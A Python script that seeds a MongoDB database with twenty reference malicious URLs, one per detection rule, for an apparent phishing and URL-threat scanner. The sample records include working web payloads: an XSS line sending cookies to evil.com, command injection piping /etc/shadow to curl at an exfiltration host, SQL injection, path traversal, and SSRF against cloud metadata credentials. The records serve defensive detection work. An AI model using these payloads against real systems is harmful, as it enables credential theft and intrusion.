"""Seed MongoDB with reference documents for EACH detection rule.

These are "ground truth" blocked/flagged URLs so that vector similarity
can boost the score of similar future scans.

Usage:
    docker-compose exec backend poetry run python -m scripts.seed_rule_examples
"""

import asyncio
import os
import logging
from datetime import datetime, timedelta

from dotenv import load_dotenv
from motor.motor_asyncio import AsyncIOMotorClient

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
DB_NAME = os.getenv("DB_NAME", "shieldnet-ai")

# Try to import embedding service for vector search support
try:
    from services.embedding_service import get_embedding
    HAS_EMBEDDING = True
except Exception:
    HAS_EMBEDDING = False
    logger.warning("Embedding service not available; seeding without embeddings")

NOW = datetime.utcnow()


def _base(url, domain, threat_class, risk, status, summary, **extra):
    """Build a base document with common fields."""
    created = NOW - timedelta(days=1)
    doc = {
        "url": url,
        "domain": domain,
        "submissionDate": created,
        "source": "rule_seed",
        "dnsStatus": "active",
        "hostingFlags": {
            "isSharedHosting": True,
            "isCloudHosted": False,
            "hostingProvider": "unknown",
            "geoLocation": "RU",
            "sslValid": False,
            "domainAgeDays": 5,
        },
        "urlStructure": {
            "pathDepth": 2,
            "hasIpAddress": False,
            "hasSuspiciousTld": True,
            "entropyScore": 4.2,
            "containsEncodedChars": False,
            "subdomainCount": 0,
        },
        "threatClassification": threat_class,
        "riskScore": risk,
        "status": status,
        "reviewedBy": "rule_seed_script",
        "summaryText": summary,
        "embedding": None,
        "queryParams": {},
        "payloadTypes": [],
        "redirectChain": None,
        "tlsCertificate": None,
        "whoisData": None,
        "scanCount": 1,
        "firstSeenAt": created,
        "lastSeenAt": created,
        "relatedDomains": [],
        "createdAt": created,
        "updatedAt": created,
    }
    doc.update(extra)
    return doc


# ────────────────────────────────────────────────────────────────────────
#  One reference document per detection rule / attack category
# ────────────────────────────────────────────────────────────────────────

RULE_EXAMPLES = [
    # 1. DGA Detection — algorithmically generated domain
    _base(
        url="https://xr7mq9k2vp4.xyz/callback",
        domain="xr7mq9k2vp4.xyz",
        threat_class="c2", risk=88.0, status="blocked",
        summary="DGA-generated domain xr7mq9k2vp4.xyz, high consonant ratio, low bigram legitimacy, C2 callback",
        dgaAnalysis={"isDGA": True, "dgaScore": 0.92, "dgaSignals": ["High consonant ratio", "Low bigram frequency"], "consonantRatio": 0.85, "bigramLegitimacy": 0.1, "domainLength": 11, "sldEntropy": 3.4},
        payloadTypes=["dns_tunneling"],
    ),

    # 2. Homoglyph / Visual Impersonation — Cyrillic lookalikes
    _base(
        url="https://g00gle-login.com/verify",
        domain="g00gle-login.com",
        threat_class="phishing", risk=92.0, status="blocked",
        summary="Homoglyph attack on google.com using digit substitution (0 for o), phishing credential harvest",
        homoglyphAnalysis={"hasHomoglyphs": True, "homoglyphSignals": ["Digit-for-letter substitution: '0' replaces 'o'", "Visual similarity to google.com"], "targetDomain": "google.com", "visualSimilarity": 0.91},
        payloadTypes=["credential_harvest"],
    ),

    # 3. Brand Impersonation — typosquat distance 1
    _base(
        url="https://goggle.in/account/verify",
        domain="goggle.in",
        threat_class="phishing", risk=90.0, status="blocked",
        summary="Brand impersonation of Google (edit distance 1), phishing keywords verify/account",
        brandImpersonation={"closest_brand": "Google", "known_domain": "google.com", "edit_distance": 1, "is_exact_match": False},
        payloadTypes=["credential_harvest"],
    ),

    # 4. Brand Impersonation — typosquat distance 2
    _base(
        url="https://gooogle.in/signin/otp",
        domain="gooogle.in",
        threat_class="phishing", risk=82.0, status="blocked",
        summary="Brand impersonation of Google (edit distance 2), phishing keywords signin/otp",
        brandImpersonation={"closest_brand": "Google", "known_domain": "google.com", "edit_distance": 2, "is_exact_match": False},
    ),

    # 5. Phishing Keywords — heavy keyword stacking
    _base(
        url="https://secure-login-portal.xyz/verify/password/otp",
        domain="secure-login-portal.xyz",
        threat_class="phishing", risk=100.0, status="blocked",
        summary="Heavy phishing keyword stacking: secure, login, portal, verify, password, otp in domain and path",
        payloadTypes=["credential_harvest"],
    ),

    # 6. Open Redirect exploitation
    _base(
        url="https://trusted-bank.com/auth?redirect=https://evil-phish.tk/steal",
        domain="trusted-bank.com",
        threat_class="phishing", risk=85.0, status="blocked",
        summary="Open redirect on trusted domain redirecting to known phishing site evil-phish.tk",
        structuralAnalysis={"structuralScore": 0.8, "structuralSignals": ["Open redirect indicators found"], "bypassTechniques": ["open_redirect"]},
        payloadTypes=["open_redirect"],
    ),

    # 7. Path Traversal attack
    _base(
        url="https://vulnerable-app.com/download?file=../../../etc/passwd",
        domain="vulnerable-app.com",
        threat_class="malware", risk=88.0, status="blocked",
        summary="Path traversal attack attempting to read /etc/passwd via directory traversal",
        structuralAnalysis={"structuralScore": 0.9, "structuralSignals": ["Path traversal sequences detected (../)"], "bypassTechniques": ["path_traversal"]},
        payloadTypes=["path_traversal"],
    ),

    # 8. XSS Payload
    _base(
        url="https://forum-site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
        domain="forum-site.com",
        threat_class="malware", risk=90.0, status="blocked",
        summary="Reflected XSS payload with cookie exfiltration via script injection",
        structuralAnalysis={"structuralScore": 0.95, "structuralSignals": ["XSS script tag injection", "Cookie theft payload"], "bypassTechniques": ["xss_payload"]},
        payloadTypes=["xss"],
    ),

    # 9. SQL Injection
    _base(
        url="https://shop-portal.com/products?id=1' UNION SELECT username,password FROM users--",
        domain="shop-portal.com",
        threat_class="malware", risk=92.0, status="blocked",
        summary="SQL injection with UNION SELECT extracting credentials from users table",
        structuralAnalysis={"structuralScore": 0.95, "structuralSignals": ["SQL injection UNION SELECT detected"], "bypassTechniques": ["sql_injection"]},
        payloadTypes=["sqli"],
    ),

    # 10. Command Injection
    _base(
        url="https://network-tool.com/ping?host=127.0.0.1;cat /etc/shadow|curl https://exfil.tk",
        domain="network-tool.com",
        threat_class="malware", risk=95.0, status="blocked",
        summary="Command injection chaining ping with /etc/shadow exfiltration via curl",
        structuralAnalysis={"structuralScore": 0.98, "structuralSignals": ["Command injection via semicolon chaining", "Data exfiltration via curl"], "bypassTechniques": ["command_injection"]},
        payloadTypes=["command_injection"],
    ),

    # 11. Base64 Encoded Payload
    _base(
        url="https://api-gateway.xyz/exec?data=cG93ZXJzaGVsbCAtZW5jb2RlZGNvbW1hbmQgSUVYKE5ldy1PYmplY3Qg",
        domain="api-gateway.xyz",
        threat_class="malware", risk=85.0, status="blocked",
        summary="Base64-encoded PowerShell command in URL parameter, likely dropper/C2 beacon",
        structuralAnalysis={"structuralScore": 0.85, "structuralSignals": ["Base64 encoded payload in parameter"], "bypassTechniques": ["base64_payload"]},
        payloadTypes=["base64_payload"],
    ),

    # 12. SSRF — Server-Side Request Forgery
    _base(
        url="https://webapp.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials",
        domain="webapp.com",
        threat_class="malware", risk=90.0, status="blocked",
        summary="SSRF targeting AWS metadata endpoint to steal IAM credentials",
        structuralAnalysis={"structuralScore": 0.92, "structuralSignals": ["SSRF targeting cloud metadata endpoint 169.254.169.254"], "bypassTechniques": ["ssrf"]},
        payloadTypes=["ssrf"],
    ),

    # 13. Credential Harvest via form action hijack
    _base(
        url="https://legit-looking-form.com/submit?formAction=https://evil-collector.tk/harvest",
        domain="legit-looking-form.com",
        threat_class="phishing", risk=87.0, status="blocked",
        summary="Credential harvest via formAction parameter pointing to external collection server",
        structuralAnalysis={"structuralScore": 0.8, "structuralSignals": ["Form action hijacking detected"], "bypassTechniques": ["credential_harvest"]},
        payloadTypes=["credential_harvest"],
    ),

    # 14. Malware Download — executable file
    _base(
        url="https://free-software.buzz/tools/update.exe",
        domain="free-software.buzz",
        threat_class="malware", risk=88.0, status="blocked",
        summary="Direct executable download (.exe) from suspicious TLD .buzz, likely malware dropper",
        payloadTypes=["malware_download"],
    ),

    # 15. IP Address as Domain — C2 infrastructure
    _base(
        url="https://45.33.32.156/beacon/check-in",
        domain="45.33.32.156",
        threat_class="c2", risk=82.0, status="blocked",
        summary="C2 beacon using raw IP address instead of domain name, typical of botnet infrastructure",
        **{"urlStructure": {"pathDepth": 2, "hasIpAddress": True, "hasSuspiciousTld": False, "entropyScore": 3.8, "containsEncodedChars": False, "subdomainCount": 0}},
    ),

    # 16. DNS Tunneling / Exfiltration — extremely long subdomain
    _base(
        url="https://aGVsbG8gd29ybGQ.data.exfil-server.tk/dns",
        domain="aGVsbG8gd29ybGQ.data.exfil-server.tk",
        threat_class="c2", risk=85.0, status="blocked",
        summary="DNS tunneling/exfiltration via base64-encoded subdomain, data hidden in DNS queries",
        dgaAnalysis={"isDGA": True, "dgaScore": 0.78, "dgaSignals": ["Base64-like subdomain pattern"], "consonantRatio": 0.6, "bigramLegitimacy": 0.15, "domainLength": 35, "sldEntropy": 3.2},
        payloadTypes=["dns_tunneling"],
    ),

    # 17. Obfuscated Path — sensitive file access
    _base(
        url="https://target-app.com/.git/config",
        domain="target-app.com",
        threat_class="suspicious", risk=75.0, status="blocked",
        summary="Attempt to access exposed .git/config file for source code/credential leakage",
        payloadTypes=["obfuscated_path"],
    ),

    # 18. Encoding Obfuscation — double-encoded path traversal
    _base(
        url="https://target.com/path?file=%252e%252e%252fetc%252fpasswd",
        domain="target.com",
        threat_class="malware", risk=86.0, status="blocked",
        summary="Double URL-encoded path traversal attempting to bypass WAF and read /etc/passwd",
        structuralAnalysis={"structuralScore": 0.88, "structuralSignals": ["Double URL encoding detected", "Path traversal via %252e"], "bypassTechniques": ["encoding_obfuscation", "path_traversal"]},
        payloadTypes=["path_traversal"],
        **{"urlStructure": {"pathDepth": 1, "hasIpAddress": False, "hasSuspiciousTld": False, "entropyScore": 4.8, "containsEncodedChars": True, "subdomainCount": 0}},
    ),

    # 19. High Entropy + Suspicious TLD + Young Domain (combo)
    _base(
        url="https://z9x8c7v6b5n4.monster/a3k/9xm2",
        domain="z9x8c7v6b5n4.monster",
        threat_class="c2", risk=80.0, status="blocked",
        summary="High entropy domain on suspicious TLD .monster, likely auto-generated C2 or malware staging",
        dgaAnalysis={"isDGA": True, "dgaScore": 0.88, "dgaSignals": ["High entropy SLD", "Consonant-heavy pattern"], "consonantRatio": 0.75, "bigramLegitimacy": 0.12, "domainLength": 12, "sldEntropy": 3.5},
    ),

    # 20. Suspended/Parked DNS — previously malicious domain
    _base(
        url="https://old-phishing-campaign.ga/expired",
        domain="old-phishing-campaign.ga",
        threat_class="phishing", risk=78.0, status="blocked",
        summary="Previously active phishing domain now suspended, historical threat record",
        dnsStatus="suspended",
    ),
]


async def main():
    client = AsyncIOMotorClient(MONGODB_URI)
    db = client[DB_NAME]
    col = db["urls"]

    inserted = 0
    skipped = 0

    for doc in RULE_EXAMPLES:
        # Skip if URL already exists
        existing = await col.find_one({"url": doc["url"]})
        if existing:
            logger.info("SKIP (exists): %s", doc["url"])
            skipped += 1
            continue

        # Generate embedding if available
        if HAS_EMBEDDING and doc.get("summaryText"):
            try:
                doc["embedding"] = await get_embedding(doc["summaryText"])
                logger.info("Embedding generated for: %s", doc["domain"])
            except Exception as e:
                logger.warning("Embedding failed for %s: %s", doc["domain"], e)

        result = await col.insert_one(doc)
        logger.info("INSERTED: %s (id=%s, score=%s, status=%s)",
                     doc["url"][:60], result.inserted_id, doc["riskScore"], doc["status"])
        inserted += 1

    logger.info("Done: %d inserted, %d skipped (already existed)", inserted, skipped)
    client.close()


if __name__ == "__main__":
    asyncio.run(main())
